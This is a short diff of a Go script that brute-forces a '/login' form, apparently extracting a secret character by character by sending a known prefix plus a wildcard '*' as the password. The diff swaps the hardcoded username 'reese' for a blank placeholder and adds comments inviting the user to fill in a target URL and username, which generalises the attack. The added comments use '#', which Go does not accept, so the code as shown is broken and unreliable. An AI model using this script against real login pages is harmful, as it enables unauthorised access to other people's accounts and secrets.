@@ -7,6 +7,7 @@ import (
 	"strings"
 )
 
+# input URL to bruteforce
 const (
 	URL = "/login"
 )
@@ -36,7 +37,8 @@ func main() {
 		}
 		password := fmt.Sprintf("%s%c*", flag, str[counter])
 		formData := url.Values{
-			"username": {"reese"},
+			# add suspected username
+			"username": {""},
 			"password": {password},
 		}
 
